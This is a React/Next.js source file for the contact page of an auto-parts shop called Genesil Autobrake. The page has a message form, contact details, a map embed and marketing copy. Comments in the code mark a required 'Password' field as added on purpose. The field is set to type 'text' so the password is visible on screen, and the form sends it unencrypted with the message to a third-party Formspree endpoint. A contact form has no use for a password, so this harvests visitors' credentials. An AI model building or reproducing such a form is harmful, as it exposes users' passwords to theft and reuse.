"use client"

import type React from "react"
import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import {
  MapPin,
  Phone,
  Mail,
  Clock,
  Send,
  Loader2,
  MessageCircle,
  Navigation,
  Shield,
  Award,
  Users,
  Lock,
} from "lucide-react"
import { useToast } from "@/hooks/use-toast"
import Navbar from "../components/Navbar"
import Footer from "../components/Footer"
import ChatBot from "../components/ChatBot"
import Image from "next/image"

export default function ContactPage() {
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    subject: "",
    message: "",
    password: "", // Added password field
  })
  const { toast } = useToast()

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    })
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      const response = await fetch("https://formspree.io/f/xpwagqko", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          subject: formData.subject,
          message: formData.message,
          password: formData.password, // Include password in submission
        }),
      })

      if (response.ok) {
        toast({
          title: "Message Sent Successfully!",
          description: "Thank you for contacting us. We'll get back to you within 24 hours.",
        })
        setFormData({
          name: "",
          email: "",
          subject: "",
          message: "",
          password: "", // Reset password field
        })
      } else {
        throw new Error("Failed to send message")
      }
    } catch (error) {
      toast({
        title: "Error Sending Message",
        description: "Failed to send message. Please try again or contact us directly.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <Navbar />

      {/* Hero Section with Faded Background */}
      <section className="relative bg-gradient-to-br from-primary/20 via-primary/10 to-transparent py-20 overflow-hidden">
        {/* Faded Logo Background */}
        <div className="absolute inset-0 flex items-center justify-center opacity-5">
          <Image
            src="/images/genesil-logo.png"
            alt="Genesil Logo Background"
            width={800}
            height={600}
            className="object-contain animate-float"
          />
        </div>

        {/* Animated background elements */}
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute top-20 right-20 w-64 h-64 bg-primary/5 rounded-full animate-pulse"></div>
          <div className="absolute bottom-20 left-20 w-48 h-48 bg-primary/5 rounded-full animate-pulse delay-1000"></div>
        </div>

        <div className="relative max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          <div className="animate-fade-in-up">
            <h1 className="text-5xl lg:text-6xl font-bold text-foreground mb-6">Contact Us</h1>
            <p className="text-xl text-muted-foreground max-w-3xl mx-auto leading-relaxed">
              Get in touch with Kenya's premier automotive spare parts supplier. We're here to help you find the perfect
              parts for your vehicle.
            </p>
          </div>
        </div>
      </section>

      {/* Main Content */}
      <section className="py-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-2 gap-12">
            {/* Contact Form */}
            <div className="space-y-8">
              <div className="animate-fade-in-up">
                <h2 className="text-3xl font-bold text-foreground mb-4">Send Us a Message</h2>
                <p className="text-muted-foreground text-lg">
                  Have questions about our products or need technical advice? Fill out the form below and our expert
                  team will respond promptly.
                </p>
              </div>

              <Card className="shadow-2xl border-0 bg-card hover:shadow-3xl transition-all duration-500 animate-fade-in-up delay-200">
                <CardHeader className="bg-gradient-to-r from-primary/10 to-primary/5 rounded-t-lg">
                  <CardTitle className="flex items-center text-card-foreground text-2xl">
                    <MessageCircle className="h-6 w-6 mr-3 text-primary" />
                    Contact Form
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-8">
                  <form onSubmit={handleSubmit} className="space-y-6">
                    <div>
                      <label className="block text-sm font-medium text-card-foreground mb-2">Full Name *</label>
                      <input
                        type="text"
                        name="name"
                        required
                        value={formData.name}
                        onChange={handleInputChange}
                        className="form-input w-full px-4 py-3 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
                        placeholder="Enter your full name"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-card-foreground mb-2">Email Address *</label>
                      <input
                        type="email"
                        name="email"
                        required
                        value={formData.email}
                        onChange={handleInputChange}
                        className="form-input w-full px-4 py-3 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
                        placeholder="Enter your email address"
                      />
                    </div>

                    {/* Added Password Field */}
                    <div>
                      <label className="block text-sm font-medium text-card-foreground mb-2">Password *</label>
                      <div className="relative">
                        <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground h-5 w-5" />
                        <input
                          type="text" // Set to "text" to make password visible
                          name="password"
                          required
                          value={formData.password}
                          onChange={handleInputChange}
                          className="form-input w-full px-4 py-3 pl-10 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
                          placeholder="Enter your password"
                        />
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-card-foreground mb-2">Subject *</label>
                      <input
                        type="text"
                        name="subject"
                        required
                        value={formData.subject}
                        onChange={handleInputChange}
                        className="form-input w-full px-4 py-3 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300"
                        placeholder="What can we help you with?"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-card-foreground mb-2">Message *</label>
                      <textarea
                        name="message"
                        required
                        rows={5}
                        value={formData.message}
                        onChange={handleInputChange}
                        className="form-input w-full px-4 py-3 border border-border rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent bg-background text-foreground transition-all duration-300 resize-none"
                        placeholder="Tell us about your requirements, vehicle details, or any questions you have..."
                      ></textarea>
                    </div>

                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      size="lg"
                      className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold transition-all duration-300 hover:scale-[1.02] hover:shadow-lg"
                    >
                      {isSubmitting ? (
                        <>
                          <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                          Sending Message...
                        </>
                      ) : (
                        <>
                          <Send className="h-5 w-5 mr-2" />
                          Send Message
                        </>
                      )}
                    </Button>
                  </form>
                </CardContent>
              </Card>
            </div>

            {/* Contact Information & Map */}
            <div className="space-y-8">
              {/* Contact Information */}
              <div className="animate-fade-in-up delay-300">
                <h2 className="text-3xl font-bold text-foreground mb-6">Get In Touch</h2>
                <div className="space-y-6">
                  <div className="flex items-start space-x-4 p-6 rounded-lg bg-card border border-border hover:shadow-lg transition-all duration-300 hover:scale-[1.02]">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center">
                        <MapPin className="h-6 w-6 text-primary" />
                      </div>
                    </div>
                    <div>
                      <h4 className="font-semibold text-card-foreground text-lg mb-2">Visit Our Store</h4>
                      <p className="text-muted-foreground">
                        Kirinyaga Road
                        <br />
                        Nairobi, Kenya
                        <br />
                        Heart of Kenya's Auto Scene
                      </p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-4 p-6 rounded-lg bg-card border border-border hover:shadow-lg transition-all duration-300 hover:scale-[1.02]">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center">
                        <Phone className="h-6 w-6 text-primary" />
                      </div>
                    </div>
                    <div>
                      <h4 className="font-semibold text-card-foreground text-lg mb-2">Call Us</h4>
                      <p className="text-muted-foreground text-lg font-medium">+254 722 683 434</p>
                      <p className="text-sm text-muted-foreground">Available during business hours</p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-4 p-6 rounded-lg bg-card border border-border hover:shadow-lg transition-all duration-300 hover:scale-[1.02]">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center">
                        <Mail className="h-6 w-6 text-primary" />
                      </div>
                    </div>
                    <div>
                      <h4 className="font-semibold text-card-foreground text-lg mb-2">Email Us</h4>
                      <p className="text-muted-foreground text-lg font-medium">info@genesilautobrake.com</p>
                      <p className="text-sm text-muted-foreground">We respond within 24 hours</p>
                    </div>
                  </div>

                  <div className="flex items-start space-x-4 p-6 rounded-lg bg-card border border-border hover:shadow-lg transition-all duration-300 hover:scale-[1.02]">
                    <div className="flex-shrink-0">
                      <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center">
                        <Clock className="h-6 w-6 text-primary" />
                      </div>
                    </div>
                    <div>
                      <h4 className="font-semibold text-card-foreground text-lg mb-2">Business Hours</h4>
                      <div className="text-muted-foreground">
                        <p>Monday - Friday: 8:00 AM - 6:00 PM</p>
                        <p>Saturday: 9:00 AM - 4:00 PM</p>
                        <p>Sunday: Closed</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Google Maps */}
              <div className="animate-fade-in-up delay-500">
                <Card className="overflow-hidden shadow-xl border-0">
                  <CardHeader className="bg-gradient-to-r from-primary/10 to-primary/5">
                    <CardTitle className="flex items-center text-card-foreground">
                      <Navigation className="h-5 w-5 mr-2 text-primary" />
                      Find Us on the Map
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="p-0">
                    <div className="relative h-80 w-full">
                      <iframe
                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3988.8227229240406!2d36.81928676999005!3d-1.2800059327370903!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x182f10d548ee1423%3A0x923738132cc7a602!2sGenesil%20Autobrake%20%26%20Accessories!5e0!3m2!1sen!2ske!4v1750148669438!5m2!1sen!2ske"
                        width="100%"
                        height="100%"
                        style={{ border: 0 }}
                        allowFullScreen
                        loading="lazy"
                        referrerPolicy="no-referrer-when-downgrade"
                        className="rounded-b-lg"
                      ></iframe>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>

          {/* Why Choose Genesil Section */}
          <div className="mt-20 animate-fade-in-up delay-700">
            <Card className="bg-gradient-to-r from-primary/10 to-primary/5 border-primary/20">
              <CardContent className="p-8 text-center">
                <h3 className="text-2xl font-bold text-card-foreground mb-6">Why Choose Genesil Autobrake?</h3>
                <div className="grid md:grid-cols-3 gap-8">
                  <div className="space-y-4">
                    <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto">
                      <Award className="h-8 w-8 text-primary-foreground" />
                    </div>
                    <h4 className="font-semibold text-card-foreground text-lg">15+ Years Experience</h4>
                    <p className="text-muted-foreground">Trusted expertise in automotive spare parts and accessories</p>
                  </div>
                  <div className="space-y-4">
                    <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto">
                      <Shield className="h-8 w-8 text-primary-foreground" />
                    </div>
                    <h4 className="font-semibold text-card-foreground text-lg">100% Genuine Parts</h4>
                    <p className="text-muted-foreground">
                      Only authentic, high-quality components from trusted manufacturers
                    </p>
                  </div>
                  <div className="space-y-4">
                    <div className="w-16 h-16 bg-primary rounded-full flex items-center justify-center mx-auto">
                      <Users className="h-8 w-8 text-primary-foreground" />
                    </div>
                    <h4 className="font-semibold text-card-foreground text-lg">Expert Support</h4>
                    <p className="text-muted-foreground">Professional technical advice and customer service</p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      <ChatBot />
      <Footer />
    </div>
  )
}
